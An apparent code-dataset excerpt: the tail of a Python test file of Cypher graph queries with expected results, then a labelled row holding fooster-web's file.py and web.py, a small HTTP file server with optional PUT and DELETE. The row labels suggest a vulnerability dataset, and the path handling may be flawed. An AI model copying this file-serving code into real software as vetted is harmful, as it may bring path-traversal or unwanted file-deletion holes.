    description='Count number of vacations per person?',
    max_run_time_ms=0.5,
    expected_result=[['Noam Nativ', 3],
                     ['Shelly Laslo Rooz', 3],
                     ['Omri Traub', 3],
                     ['Lucy Yanfital', 3],
                     ['Jane Chernomorin', 3],
                     ['Alon Fital', 3]]
)

all_reachable_friends_query = QueryInfo(
    query=""""""MATCH (a:person {name:'Roi Lipman'})-[:friend*]->(b:person)
             RETURN b.name
             ORDER BY b.name"""""",
    description='Find all reachable friends',
    max_run_time_ms=0.3,
    expected_result=[['Ailon Velger'],
                     ['Alon Fital'],
                     ['Boaz Arad'],
                     ['Gal Derriere'],
                     ['Jane Chernomorin'],
                     ['Lucy Yanfital'],
                     ['Mor Yesharim'],
                     ['Noam Nativ'],
                     ['Omri Traub'],
                     ['Ori Laslo'],
                     ['Shelly Laslo Rooz'],
                     ['Tal Doron'],
                     ['Valerie Abigail Arad']]
)

all_reachable_countries_query = QueryInfo(
    query=""""""MATCH (a:person {name:'Roi Lipman'})-[*]->(c:country)
             RETURN c.name, count(c.name) AS NumPathsToCountry
             ORDER BY NumPathsToCountry DESC"""""",
    description='Find all reachable countries',
    max_run_time_ms=0.6,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Canada', 2],
                     ['China', 2],
                     ['Andora', 2],
                     ['Germany', 2],
                     ['Japan', 2],
                     ['Russia', 1],
                     ['Italy', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1]]
)

reachable_countries_or_people_query = QueryInfo(
    query=""""""MATCH (s:person {name:'Roi Lipman'})-[e:friend|:visited]->(t)
             RETURN s.name,TYPE(e),t.name
             ORDER BY t.name"""""",
    description='Every person or country one hop away from source node',
    max_run_time_ms=0.2,
    expected_result=[[""Roi Lipman"", ""friend"", ""Ailon Velger""],
                     [""Roi Lipman"", ""friend"", ""Alon Fital""],
                     [""Roi Lipman"", ""friend"", ""Boaz Arad""],
                     [""Roi Lipman"", ""visited"", ""Japan""],
                     [""Roi Lipman"", ""friend"", ""Omri Traub""],
                     [""Roi Lipman"", ""friend"", ""Ori Laslo""],
                     [""Roi Lipman"", ""visited"", ""Prague""],
                     [""Roi Lipman"", ""visited"", ""Prague""],
                     [""Roi Lipman"", ""friend"", ""Tal Doron""],
                     [""Roi Lipman"", ""visited"", ""USA""]]
)

all_reachable_countries_or_people_query = QueryInfo(
    query=""""""MATCH (a:person {name:'Roi Lipman'})-[:friend|:visited*]->(e)
             RETURN e.name, count(e.name) AS NumPathsToEntity
             ORDER BY NumPathsToEntity DESC"""""",
    description='Every reachable person or country from source node',
    max_run_time_ms=0.4,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Andora', 2],
                     ['Japan', 2],
                     ['Germany', 2],
                     ['Canada', 2],
                     ['China', 2],
                     ['Ailon Velger', 1],
                     ['Alon Fital', 1],
                     ['Gal Derriere', 1],
                     ['Jane Chernomorin', 1],
                     ['Omri Traub', 1],
                     ['Boaz Arad', 1],
                     ['Noam Nativ', 1],
                     ['Shelly Laslo Rooz', 1],
                     ['Russia', 1],
                     ['Valerie Abigail Arad', 1],
                     ['Mor Yesharim', 1],
                     ['Italy', 1],
                     ['Tal Doron', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1],
                     ['Lucy Yanfital', 1],
                     ['Ori Laslo', 1]]
)

all_reachable_entities_query = QueryInfo(
    query=""""""MATCH (a:person {name:'Roi Lipman'})-[*]->(e)
             RETURN e.name, count(e.name) AS NumPathsToEntity
             ORDER BY NumPathsToEntity DESC"""""",
    description='Find all reachable entities',
    max_run_time_ms=0.4,
    expected_result=[['USA', 14],
                     ['Netherlands', 6],
                     ['Prague', 5],
                     ['Greece', 4],
                     ['Andora', 2],
                     ['Japan', 2],
                     ['Germany', 2],
                     ['Canada', 2],
                     ['China', 2],
                     ['Ailon Velger', 1],
                     ['Alon Fital', 1],
                     ['Gal Derriere', 1],
                     ['Jane Chernomorin', 1],
                     ['Omri Traub', 1],
                     ['Boaz Arad', 1],
                     ['Noam Nativ', 1],
                     ['Shelly Laslo Rooz', 1],
                     ['Russia', 1],
                     ['Valerie Abigail Arad', 1],
                     ['Mor Yesharim', 1],
                     ['Italy', 1],
                     ['Tal Doron', 1],
                     ['Thailand', 1],
                     ['Kazakhstan', 1],
                     ['Lucy Yanfital', 1],
                     ['Ori Laslo', 1]]
)

delete_friendships_query = QueryInfo(
    query=""""""MATCH (ME:person {name:'Roi Lipman'})-[e:friend]->() DELETE e"""""",
    description='Delete frienships',
    max_run_time_ms=0.25,
    expected_result=[]
)

delete_person_query = QueryInfo(
    query=""""""MATCH (ME:person {name:'Roi Lipman'}) DELETE ME"""""",
    description='Delete myself from the graph',
    max_run_time_ms=0.2,
    expected_result=[]
)

post_delete_label_query = QueryInfo(
    query=""""""MATCH (p:person) RETURN p.name"""""",
    description='Retrieve all nodes with person label',
    max_run_time_ms=0.15,
    expected_result=[['Boaz Arad'],
                     ['Valerie Abigail Arad'],
                     ['Ori Laslo'],
                     ['Shelly Laslo Rooz'],
                     ['Ailon Velger'],
                     ['Noam Nativ'],
                     ['Jane Chernomorin'],
                     ['Alon Fital'],
                     ['Mor Yesharim'],
                     ['Gal Derriere'],
                     ['Lucy Yanfital'],
                     ['Tal Doron'],
                     ['Omri Traub']]
)

queries_info = [
    graph_entities,
    relation_type_counts,
    subset_of_people,
    my_friends_query,
    friends_of_friends_query,
    friends_of_friends_single_and_over_30_query,
    friends_of_friends_visited_netherlands_and_single_query,
    friends_visited_same_places_as_me_query,
    friends_older_than_me_query,
    friends_age_difference_query,
    friends_who_are_older_than_average,
    how_many_countries_each_friend_visited_query,    
    visit_purpose_of_each_country_i_visited_query,
    who_was_on_business_trip_query,
    number_of_vacations_per_person_query,
    all_reachable_friends_query,
    all_reachable_countries_query,
    reachable_countries_or_people_query,
    all_reachable_countries_or_people_query,
    all_reachable_entities_query,
    happy_birthday_query,
    friends_age_statistics_query,
    delete_friendships_query,
    delete_person_query,
    post_delete_label_query
]
/n/n/n",1
62,80202a6d3788ad1212a162d19785c600025e6aa4,"fooster/web/file.py/n/nimport collections
import mimetypes
import os
import re
import shutil

from fooster import web


def normpath(path):
    old_path = path.split('/')
    new_path = collections.deque()

    for entry in old_path:
        # ignore empty paths - A//B -> A/B
        if not entry:
            continue
        # ignore dots - A/./B -> A/B
        elif entry == '.':
            continue
        # go back a level by popping the last directory off (if there is one) - A/foo/../B -> A/B
        elif entry == '..':
            if len(new_path) > 0:
                new_path.pop()
        else:
            new_path.append(entry)

    # special case for leading slashes
    if old_path[0] == '':
        new_path.appendleft('')

    # special case for trailing slashes
    if old_path[-1] == '':
        new_path.append('')

    return '/'.join(new_path)


class FileHandler(web.HTTPHandler):
    filename = None
    dir_index = False

    def index(self):
        # magic for stringing together everything in the directory with a newline and adding a / at the end for directories
        return ''.join(filename + '/\n' if os.path.isdir(os.path.join(self.filename, filename)) else filename + '\n' for filename in os.listdir(self.filename))

    def get_body(self):
        return False

    def do_get(self):
        try:
            if os.path.isdir(self.filename):
                # if necessary, redirect to add trailing slash
                if not self.filename.endswith('/'):
                    self.response.headers.set('Location', self.request.resource + '/')

                    return 307, ''

                # check for index file
                index = self.filename + 'index.html'
                if os.path.exists(index) and os.path.isfile(index):
                    indexfile = open(index, 'rb')
                    self.response.headers.set('Content-Type', 'text/html')
                    self.response.headers.set('Content-Length', str(os.path.getsize(index)))

                    return 200, indexfile
                elif self.dir_index:
                    # if no index and directory indexing enabled, send a generated one
                    return 200, self.index()
                else:
                    raise web.HTTPError(403)
            else:
                file = open(self.filename, 'rb')

                # get file size from metadata
                size = os.path.getsize(self.filename)
                length = size

                # HTTP status that changes if partial data is sent
                status = 200

                # handle range header and modify file pointer and content length as necessary
                range_header = self.request.headers.get('Range')
                if range_header:
                    range_match = re.match('bytes=(\d+)-(\d+)?', range_header)
                    if range_match:
                        # get lower and upper bounds
                        lower = int(range_match.group(1))
                        if range_match.group(2):
                            upper = int(range_match.group(2))
                        else:
                            upper = size - 1

                        # sanity checks
                        if upper < size and upper >= lower:
                            file.seek(lower)
                            self.response.headers.set('Content-Range', 'bytes ' + str(lower) + '-' + str(upper) + '/' + str(size))
                            length = upper - lower + 1
                            status = 206

                self.response.headers.set('Content-Length', str(length))

                # tell client we allow selecting ranges of bytes
                self.response.headers.set('Accept-Ranges', 'bytes')

                # guess MIME by extension
                mime = mimetypes.guess_type(self.filename)[0]
                if mime:
                    self.response.headers.set('Content-Type', mime)

                return status, file
        except FileNotFoundError:
            raise web.HTTPError(404)
        except NotADirectoryError:
            raise web.HTTPError(404)
        except OSError:
            raise web.HTTPError(403)


class ModifyMixIn:
    def do_put(self):
        try:
            # make sure directories are there (including the given one if not given a file)
            os.makedirs(os.path.dirname(self.filename), exist_ok=True)

            # send a 100 continue if expected
            if self.request.headers.get('Expect') == '100-continue':
                self.check_continue()
                self.response.wfile.write((web.http_version + ' 100 ' + web.status_messages[100] + '\r\n\r\n').encode(web.http_encoding))
                self.response.wfile.flush()

            # open (possibly new) file and fill it with request body
            with open(self.filename, 'wb') as file:
                bytes_left = int(self.request.headers.get('Content-Length', '0'))
                while True:
                    chunk = self.request.rfile.read(min(bytes_left, web.stream_chunk_size))
                    if not chunk:
                        break
                    bytes_left -= len(chunk)
                    file.write(chunk)

            return 204, ''
        except OSError:
            raise web.HTTPError(403)

    def do_delete(self):
        try:
            if os.path.isdir(self.filename):
                # recursively remove directory
                shutil.rmtree(self.filename)
            else:
                # remove single file
                os.remove(self.filename)

            return 204, ''
        except FileNotFoundError:
            raise web.HTTPError(404)
        except OSError:
            raise web.HTTPError(403)


class ModifyFileHandler(ModifyMixIn, FileHandler):
    pass


def new(local, remote='', dir_index=False, modify=False, handler=FileHandler):
    # remove trailing slashes if necessary
    if local.endswith('/'):
        local = local[:-1]
    if remote.endswith('/'):
        remote = remote[:-1]

    # set the appropriate inheritance whether modification is allowed
    if modify:
        inherit = ModifyMixIn, handler
    else:
        inherit = handler,

    # create a file handler for routes
    class GenFileHandler(*inherit):
        def respond(self):
            norm_request = normpath(self.groups['path'])
            if self.groups['path'] != norm_request:
                self.response.headers.set('Location', self.remote + norm_request)

                return 307, ''

            self.filename = self.local + self.groups['path']

            return handler.respond(self)

    GenFileHandler.local = local
    GenFileHandler.remote = remote
    GenFileHandler.dir_index = dir_index

    return {remote + '(?P<path>|/[^?#]*)(?P<query>[?#].*)?': GenFileHandler}


if __name__ == '__main__':
    import signal

    from argparse import ArgumentParser

    parser = ArgumentParser(description='quickly serve up local files over HTTP')
    parser.add_argument('-a', '--address', default='', dest='address', help='address to serve HTTP on (default: \'\')')
    parser.add_argument('-p', '--port', default=8000, type=int, dest='port', help='port to serve HTTP on (default: 8000)')
    parser.add_argument('--no-index', action='store_false', default=True, dest='indexing', help='disable directory listings')
    parser.add_argument('--allow-modify', action='store_true', default=False, dest='modify', help='allow file and directory modifications using PUT and DELETE methods')
    parser.add_argument('local_dir', help='local directory to serve over HTTP')

    args = parser.parse_args()

    httpd = web.HTTPServer((args.address, args.port), new(args.local_dir, dir_index=args.indexing, modify=args.modify))
    httpd.start()

    signal.signal(signal.SIGINT, lambda signum, frame: httpd.close())

    httpd.join()
/n/n/nfooster/web/web.py/n/nimport collections
import io
import logging
import multiprocessing
import os
import queue
import re
import selectors
import signal
import shutil
import socket
import socketserver
import ssl
import sys
import tempfile
import time
import urllib.parse


# module details
name = 'fooster-web'
version = '0.3rc3'

# server details
server_version = name + '/' + version
http_version = 'HTTP/1.1'
http_encoding = 'iso-8859-1'
default_encoding = 'utf-8'

# constraints
max_line_size = 4096
max_headers = 64
max_request_size = 1048576  # 1 MB
stream_chunk_size = 8192

# standard HTTP status messages
status_messages = {
    # 1xx Informational
    100: 'Continue',
    101: 'Switching Protocols',
    102: 'Processing',

    # 2xx Success
    200: 'OK',
    201: 'Created',
    202: 'Accepted',
    203: 'Non-Authoritative Information',
    204: 'No Content',
    205: 'Reset Content',
    206: 'Partial Content',
    207: 'Multi-Status',
    208: 'Already Reported',
    226: 'IM Used',

    # 3xx Redirection
    300: 'Multiple Choices',
    301: 'Moved Permanently',
    302: 'Found',
    303: 'See Other',
    304: 'Not Modified',
    305: 'Use Proxy',
    306: 'Switch Proxy',
    307: 'Temporary Redirect',
    308: 'Permanent Redirect',

    # 4xx Client Error
    400: 'Bad Request',
    401: 'Unauthorized',
    402: 'Payment Required',
    403: 'Forbidden',
    404: 'Not Found',
    405: 'Method Not Allowed',
    406: 'Not Acceptable',
    407: 'Proxy Authentication Required',
    408: 'Request Timeout',
    409: 'Conflict',
    410: 'Gone',
    411: 'Length Required',
    412: 'Precondition Failed',
    413: 'Payload Too Large',
    414: 'URI Too Long',
    415: 'Unsupported Media Type',
    416: 'Range Not Satisfiable',
    417: 'Expectation Failed',
    418: 'I\'m a teapot',
    419: 'Authentication Timeout',
    422: 'Unprocessable Entity',
    423: 'Locked',
    424: 'Failed Dependency',
    425: 'Unordered Collection',
    426: 'Upgrade Required',
    428: 'Precondition Required',
    429: 'Too Many Requests',
    431: 'Request Header Fields Too Large',
    451: 'Unavailable For Legal Reasons',

    # 5xx Server Error
    500: 'Internal Server Error',
    501: 'Not Implemented',
    502: 'Bad Gateway',
    503: 'Service Unavailable ',
    504: 'Gateway Timeout',
    505: 'HTTP Version Not Supported',
    506: 'Variant Also Negotiates',
    507: 'Insufficient Storage',
    508: 'Loop Detected',
    510: 'Not Extended',
    511: 'Network Authentication Required',
}


def mktime(timeval, tzname='GMT'):
    return time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(tzname), timeval)


class ResLock:
    class LockProxy:
        def __init__(self, dir, resource):
            self.dir = dir
            self.resource = resource

            # replace / with space, an invalid URI character
            self.path = os.path.join(self.dir, self.resource.replace('/', ' '))

            self.readers_file = os.path.join(self.path, 'readers')
            self.processes_file = os.path.join(self.path, 'processes')
            self.request_file = os.path.join(self.path, 'request')

            self.fd = -1
            self.write_file = os.path.join(self.path, 'write.lock')

            # set default values if lock does not exist
            if not os.path.exists(self.path):
                os.mkdir(self.path)
                self.readers = 0
                self.processes = 0

        @property
        def readers(self):
            with open(self.readers_file, 'r') as file:
                return int(file.read())

        @readers.setter
        def readers(self, value):
            with open(self.readers_file, 'w') as file:
                file.write(str(value))

        @property
        def processes(self):
            with open(self.processes_file, 'r') as file:
                return int(file.read())

        @processes.setter
        def processes(self, value):
            with open(self.processes_file, 'w') as file:
                file.write(str(value))

        @property
        def request(self):
            try:
                with open(self.request_file, 'r') as file:
                    return int(file.read())
            except FileNotFoundError:
                return None

        @request.setter
        def request(self, value):
            with open(self.request_file, 'w') as file:
                file.write(str(value))

        def clean(self):
            os.unlink(self.readers_file)
            os.unlink(self.processes_file)
            os.unlink(self.request_file)
            os.rmdir(self.path)

        def acquire(self):
            try:
                os.close(os.open(self.write_file, os.O_CREAT | os.O_EXCL | os.O_RDWR))

                return True
            except FileExistsError:
                return False

        def release(self):
            os.unlink(self.write_file)

    def __init__(self, sync):
        self.sync = sync

        self.lock = self.sync.Lock()
        self.requests = self.sync.dict()

        self.id = os.getpid()

        self.dir = tempfile.mkdtemp()
        self.delay = 0.05

    def acquire(self, request, resource, nonatomic):
        request_id = id(request)

        with self.lock:
            # proxy a resource lock
            res_lock = ResLock.LockProxy(self.dir, resource)

            request_lock = res_lock.request

            # set request if none
            if res_lock.request is None:
                res_lock.request = request_id

                try:
                    # repropagate list
                    tmp = self.requests[self.id]
                    tmp.append(request_id)
                    self.requests[self.id] = tmp
                except KeyError:
                    self.requests[self.id] = [request_id]

            # increment processes using lock
            res_lock.processes += 1

            # re-enter if we own the request and the same request holds the lock
            if request_lock and request_lock == request_id and self.id in self.requests and request_id in self.requests[self.id]:
                return True

        # if a read or write
        if nonatomic:
            # acquire write lock
            locked = res_lock.acquire()
            if not locked:
                # bail if lock failed
                with self.lock:
                    res_lock.processes -= 1
                return False

            # update readers
            with self.lock:
                res_lock.readers += 1

            # release write lock
            res_lock.release()
        else:
            # acquire write lock
            locked = res_lock.acquire()
            if not locked:
                with self.lock:
                    res_lock.processes -= 1
                return False

            # wait for readers
            while res_lock.readers > 0:
                time.sleep(self.delay)

            # update controlling request
            res_lock.request = request_id

        return True

    def release(self, resource, nonatomic, last=True):
        with self.lock:
            # proxy a resource lock
            res_lock = ResLock.LockProxy(self.dir, resource)

            if res_lock.readers <= 0 and res_lock.processes <= 0:
                raise RuntimeError('release unlocked lock')

            # decrement process unless this is the only one left but not the last
            if last or res_lock.processes > 1:
                res_lock.processes -= 1

            # if all of the processes are done
            if res_lock.processes == 0:
                # clean up request id
                for id in list(self.requests.keys()):
                    # remove request from appropriate list
                    if res_lock.request in self.requests[id]:
                        # repropagate list
                        tmp = self.requests[id]
                        tmp.remove(res_lock.request)
                        self.requests[id] = tmp

                    # remove id if necessary
                    if len(self.requests[id]) == 0:
                        del self.requests[id]

                release = True
            else:
                release = False

        if nonatomic:
            # decrement this reader
            with self.lock:
                res_lock.readers -= 1
        else:
            # release write if necessary
            if release:
                res_lock.release()

        # clean up lock if done with
        with self.lock:
            if res_lock.readers <= 0 and res_lock.processes <= 0:
                res_lock.clean()

    def clean(self):
        shutil.rmtree(self.dir, ignore_errors=True)


class HTTPLogFilter(logging.Filter):
    def filter(self, record):
        record.host, record.request, record.code, record.size, record.ident, record.authuser = record.msg

        return True


class HTTPLogFormatter(logging.Formatter):
    def __init__(self, fmt='{host} {ident} {authuser} [{asctime}] ""{request}"" {code} {size}', datefmt='%d/%b/%Y:%H:%M:%S %z', style='{', **kwargs):
        logging.Formatter.__init__(self, fmt, datefmt, style, **kwargs)


class HTTPHeaders:
    def __init__(self):
        # lower case header -> value
        self.headers = {}
        # lower case header -> actual case header
        self.headers_actual = {}

    def __iter__(self):
        for key in self.headers.keys():
            yield self.retrieve(key)
        yield '\r\n'

    def __len__(self):
        return len(self.headers)

    def __getitem__(self, key):
        return self.headers[key.lower()]

    def __setitem__(self, key, value):
        self.set(key, value)

    def __delitem__(self, key):
        self.remove(key)

    def clear(self):
        self.headers.clear()
        self.headers_actual.clear()

    def add(self, header):
        # HTTP Status 431
        # check if there are too many headers
        if len(self) >= max_headers:
            raise HTTPError(431)

        # HTTP Status 431
        # check if an individual header is too large
        if len(header) > max_line_size:
            raise HTTPError(431, status_message=(header.split(':', 1)[0] + ' Header Too Large'))

        # HTTP Status 400
        # sanity checks for headers
        if header[-2:] != '\r\n' or ':' not in header:
            raise HTTPError(400)

        # magic for removing newline on header, splitting at the first colon, and removing all extraneous whitespace
        key, value = (item.strip() for item in header[:-2].split(':', 1))
        self.set(key.lower(), value)

    def get(self, key, default=None):
        return self.headers.get(key.lower(), default)

    def set(self, key, value):
        if not isinstance(key, str):
            raise TypeError('\'key\' can only be of type \'str\'')
        if not isinstance(value, str):
            raise TypeError('\'value\' can only be of type \'str\'')
        dict_key = key.lower()
        self.headers[dict_key] = value
        self.headers_actual[dict_key] = key

    def remove(self, key):
        dict_key = key.lower()
        del self.headers[dict_key]
        del self.headers_actual[dict_key]

    def retrieve(self, key):
        return self.headers_actual[key.lower()] + ': ' + self.get(key) + '\r\n'


class HTTPError(Exception):
    def __init__(self, code, message=None, headers=None, status_message=None):
        self.code = code
        self.message = message
        self.headers = headers
        self.status_message = status_message


class HTTPHandler:
    nonatomic = ['options', 'head', 'get']

    def __init__(self, request, response, groups):
        self.server = request.server
        self.request = request
        self.response = response
        self.method = self.request.method.lower()
        self.groups = groups

    def encode(self, body):
        return body

    def decode(self, body):
        return body

    def methods(self):
        # things not to show
        hidden = []

        # hide head when there is no get
        if not hasattr(self, 'do_get'):
            hidden.append('head')

        # lots of magic for finding all lower case attributes beginning with 'do_' and removing the 'do_'
        return (option[3:] for option in dir(self) if option.startswith('do_') and option.islower() and option[3:] not in hidden)

    def respond(self):
        # HTTP Status 405
        if not hasattr(self, 'do_' + self.method):
            error_headers = HTTPHeaders()
            error_headers.set('Allow', ','.join(method.upper() for method in self.methods()))
            raise HTTPError(405, headers=error_headers)

        # get the body for the method if wanted
        if self.get_body():
            try:
                body_length = int(self.request.headers.get('Content-Length', '0'))
            except ValueError:
                raise HTTPError(400)

            # HTTP Status 413
            if max_request_size and body_length > max_request_size:
                raise HTTPError(413)

            # if client is expecting a 100, give self a chance to check it and raise an HTTPError if necessary
            if self.request.headers.get('Expect') == '100-continue':
                self.check_continue()
                self.response.wfile.write((http_version + ' 100 ' + status_messages[100] + '\r\n\r\n').encode(http_encoding))
                self.response.wfile.flush()

            # decode body from input
            self.request.body = self.decode(self.request.rfile.read(body_length))

        # run the do_* method of the implementation
        raw_response = getattr(self, 'do_' + self.method)()

        # encode body from output
        try:
            status, response = raw_response

            return status, self.encode(response)
        except ValueError:
            status, status_msg, response = raw_response

            return status, status_msg, self.encode(response)

    def check_continue(self):
        pass

    def get_body(self):
        return self.method == 'post' or self.method == 'put' or self.method == 'patch'

    def do_options(self):
        self.response.headers.set('Allow', ','.join(method.upper() for method in self.methods()))

        return 204, ''

    def do_head(self):
        # tell response to not write the body
        self.response.write_body = False

        # try self again with get
        self.method = 'get'
        return self.respond()


class DummyHandler(HTTPHandler):
    nonatomic = True

    def __init__(self, request, response, groups, error=HTTPError(500)):
        HTTPHandler.__init__(self, request, response, groups)
        self.error = error

    def respond(self):
        raise self.error


class HTTPErrorHandler(HTTPHandler):
    nonatomic = True

    def __init__(self, request, response, groups, error=HTTPError(500)):
        HTTPHandler.__init__(self, request, response, groups)
        self.error = error

    def respond(self):
        if self.error.status_message:
            status_message = self.error.status_message
        else:
            status_message = status_messages[self.error.code]

        if self.error.message:
            message = self.error.message
        else:
            message = str(self.error.code) + ' - ' + status_message + '\n'

        return self.error.code, status_message, message


class HTTPResponse:
    def __init__(self, connection, client_address, server, request):
        self.connection = connection
        self.client_address = client_address
        self.server = server

        self.wfile = self.connection.makefile('wb', 0)

        self.request = request

    def handle(self):
        self.write_body = True

        self.headers = HTTPHeaders()

        try:
            try:
                nonatomic = self.request.method.lower() in self.request.handler.nonatomic
            except TypeError:
                nonatomic = self.request.handler.nonatomic

            locked = False

            try:
                # try to get the resource, locking if atomic
                locked = self.server.res_lock.acquire(self.request, self.request.resource, nonatomic)

                if locked:
                    # disable skip
                    self.request.skip = False
                else:
                    # put back in request queue (and skip parsing stage next time)
                    self.request.skip = True

                    # check if socket is still open
                    try:
                        # HTTP Status 100
                        self.wfile.write((http_version + ' 100 ' + status_messages[100] + '\r\n\r\n').encode(http_encoding))
                        self.wfile.flush()
                    except ConnectionError:
                        # bail on socket error
                        raise HTTPError(408)

                    return False

                # get the raw response
                raw_response = self.request.handler.respond()
            except Exception as error:
                # if it isn't a standard HTTPError, log it and send a 500
                if not isinstance(error, HTTPError):
                    self.server.log.exception('Internal Server Error')
                    error = HTTPError(500)

                # set headers to the error headers if applicable, else make a new set
                if error.headers:
                    self.headers = error.headers
                else:
                    self.headers = HTTPHeaders()

                # find an appropriate error handler, defaulting to HTTPErrorHandler
                s_code = str(error.code)
                for regex, handler in self.server.error_routes.items():
                    match = regex.match(s_code)
                    if match:
                        error_handler = handler(self.request.handler.request, self.request.handler.response, self.request.handler.groups, error)
                        break
                else:
                    error_handler = HTTPErrorHandler(self.request.handler.request, self.request.handler.response, self.request.handler.groups, error)

                # use the error response as normal
                raw_response = error_handler.respond()

            # make sure to unlock if locked before
            if locked:
                self.server.res_lock.release(self.request.resource, nonatomic)

            # get data from response
            try:
                status, response = raw_response
                status_msg = status_messages[status]
            except ValueError:
                status, status_msg, response = raw_response

            # take care of encoding and headers
            if isinstance(response, io.IOBase):
                # use chunked encoding if Content-Length not set
                if not self.headers.get('Content-Length'):
                    self.headers.set('Transfer-Encoding', 'chunked')
            else:
                # convert response to bytes if necessary
                if not isinstance(response, bytes):
                    response = response.encode(default_encoding)

                # set Content-Length for bytes
                self.headers.set('Content-Length', str(len(response)))
        except Exception:
            # catch the most general errors and tell the client with the least likelihood of throwing another exception
            status = 500
            status_msg = status_messages[status]
            response = (str(status) + ' - ' + status_msg + '\n').encode(default_encoding)
            self.headers = HTTPHeaders()
            self.headers.set('Content-Length', str(len(response)))

            self.server.log.exception('Severe Server Error')

        # remove keepalive on errors
        if status >= 400:
            self.request.keepalive = False

        # set a few necessary headers (that should not be changed)
        if not self.request.keepalive:
            self.headers.set('Connection', 'close')
        self.headers.set('Server', server_version)
        self.headers.set('Date', mktime(time.gmtime()))

        # prepare response_length
        response_length = 0

        # if writes fail, the streams are probably closed so log and ignore the error
        try:
            # send HTTP response
            self.wfile.write((http_version + ' ' + str(status) + ' ' + status_msg + '\r\n').encode(http_encoding))

            # have headers written
            for header in self.headers:
                self.wfile.write(header.encode(http_encoding))

            # write body
            if isinstance(response, io.IOBase):
                # for a stream, write chunk by chunk and add each chunk size to response_length
                try:
                    # check whether body needs to be written
                    if self.write_body:
                        content_length = self.headers.get('Content-Length')
                        if content_length:
                            # if there is a Content-Length, write that much from the stream
                            bytes_left = int(content_length)
                            while True:
                                chunk = response.read(min(bytes_left, stream_chunk_size))
                                # give up if chunk length is zero (when content-length is longer than the stream)
                                if not chunk:
                                    break
                                bytes_left -= len(chunk)
                                response_length += self.wfile.write(chunk)
                        else:
                            # if no Content-Length, used chunked encoding
                            while True:
                                chunk = response.read(stream_chunk_size)
                                # write a hex representation (without any decorations) of the length of the chunk and the chunk separated by newlines
                                response_length += self.wfile.write(('{:x}'.format(len(chunk)) + '\r\n').encode(http_encoding) + chunk + '\r\n'.encode(http_encoding))
                                # after chunk length is 0, break
                                if not chunk:
                                    break
                # cleanup
                finally:
                    response.close()
            else:
                # check whether body needs to be written
                if self.write_body and response:
                    # just write the whole response and get length
                    response_length += self.wfile.write(response)

            self.wfile.flush()
        except ConnectionError:
            # bail on socket error
            pass
        except Exception:
            self.server.log.exception('Response Write Failed')

        request_log = (self.client_address[0], self.request.request_line, str(status), str(response_length), '-', '-')

        if status >= 500:
            request_level = logging.ERROR
        elif status >= 400:
            request_level = logging.WARNING
        else:
            request_level = logging.INFO

        self.server.http_log.log(request_level, request_log)

        return True

    def close(self):
        self.wfile.close()


class HTTPRequest:
    def __init__(self, connection, client_address, server, timeout=None):
        self.connection = connection
        self.client_address = client_address
        self.server = server

        self.timeout = timeout

        self.skip = False

        # disable nagle's algorithm
        self.connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)

        self.rfile = self.connection.makefile('rb', -1)

        self.response = HTTPResponse(connection, client_address, server, self)

    def handle(self, keepalive=True, initial_timeout=None):
        # we are requested to skip processing and keep the previous values
        if self.skip:
            return self.response.handle()

        # default to no keepalive in case something happens while even trying ensure we have a request
        self.keepalive = False

        self.headers = HTTPHeaders()

        # if initial_timeout is set, only wait that long for the initial request line
        if initial_timeout:
            self.connection.settimeout(initial_timeout)
        else:
            self.connection.settimeout(self.timeout)

        # get request line
        try:
            # ignore empty lines waiting on request
            request = '\r\n'
            while request == '\r\n':
                request = self.rfile.readline(max_line_size + 1).decode(http_encoding)
        # if read hits timeout or has some other error, ignore the request
        except Exception:
            return True

        # ignore empty requests
        if not request:
            return True

        # we have a request, go back to normal timeout
        if initial_timeout:
            self.connection.settimeout(self.timeout)

        # remove \r\n from the end
        self.request_line = request[:-2]

        # set some reasonable defaults in case the worst happens and we need to tell the client
        self.method = ''
        self.resource = '/'

        try:
            # HTTP Status 414
            if len(request) > max_line_size:
                raise HTTPError(414)

            # HTTP Status 400
            if request[-2:] != '\r\n':
                raise HTTPError(400)

            # try the request line and error out if can't parse it
            try:
                self.method, resource, self.request_http = self.request_line.split()
                self.resource = urllib.parse.unquote(resource)
            # HTTP Status 400
            except ValueError:
                raise HTTPError(400)

            # HTTP Status 505
            if self.request_http != http_version:
                raise HTTPError(505)

            # read and parse request headers
            while True:
                line = self.rfile.readline(max_line_size + 1).decode(http_encoding)

                # hit end of headers
                if line == '\r\n':
                    break

                self.headers.add(line)

            # if we are requested to close the connection after we finish, do so
            if self.headers.get('Connection') == 'close':
                self.keepalive = False
            # else since we are sure we have a request and have read all of the request data, keepalive for more later (if allowed)
            else:
                self.keepalive = keepalive

            # find a matching regex to handle the request with
            for regex, handler in self.server.routes.items():
                match = regex.match(self.resource)
                if match:
                    # create a dictionary of groups
                    groups = match.groupdict()
                    values = groups.values()

                    for idx, group in enumerate(match.groups()):
                        if group not in values:
                            groups[idx] = group

                    # create handler
                    self.handler = handler(self, self.response, groups)
                    break
            # HTTP Status 404
            # if loop is not broken (handler is not found), raise a 404
            else:
                raise HTTPError(404)
        # use DummyHandler so the error is raised again when ready for response
        except Exception as error:
            self.handler = DummyHandler(self, self.response, (), error)
        finally:
            # we finished listening and handling early errors and so let a response class now finish up the job of talking
            return self.response.handle()

    def close(self):
        self.rfile.close()
        self.response.close()


class HTTPServer(socketserver.TCPServer):
    allow_reuse_address = True

    def __init__(self, address, routes, error_routes={}, keyfile=None, certfile=None, keepalive=5, timeout=20, num_processes=2, max_processes=6, max_queue=4, poll_interval=0.2, log=None, http_log=None, sync=None):
        # make route dictionaries
        self.routes = collections.OrderedDict()
        self.error_routes = collections.OrderedDict()

        # compile the regex routes and add them
        for regex, handler in routes.items():
            self.routes[re.compile('^' + regex + '$')] = handler
        for regex, handler in error_routes.items():
            self.error_routes[re.compile('^' + regex + '$')] = handler

        # store constants
        self.keyfile = keyfile
        self.certfile = certfile

        self.using_tls = keyfile and certfile

        self.keepalive_timeout = keepalive
        self.request_timeout = timeout

        self.num_processes = num_processes
        self.max_processes = max_processes
        self.max_queue = max_queue

        self.poll_interval = poll_interval

        # create manager and namespaces
        if sync:
            self.sync = sync
        else:
            # ignore SIGINT in manager
